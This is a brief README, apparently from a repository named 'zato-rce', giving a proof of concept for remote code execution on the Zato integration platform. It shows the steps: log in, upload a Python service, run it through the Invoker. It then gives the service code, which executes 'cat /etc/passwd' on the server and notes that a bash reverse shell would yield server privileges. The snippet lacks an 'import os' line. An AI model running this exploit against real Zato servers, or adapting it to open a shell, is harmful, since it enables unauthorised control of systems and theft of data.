# zato-rce
- Login in Zato;
- Click "Services"-"List services"-"Upload services"
- Upload PoC Python Script(in attachment)
- Click uploaded files and click "Invoker",last submit.
- Server execute code.If I change the command to "Bash Reverse Shell" ,i will gain server privileges.

PoC:
```
from zato.server.service import Service
import json

class OeNotice(Service):
    def handle(self):
        self.response.payload={'result':os.popen("cat /etc/passwd").read()}
```
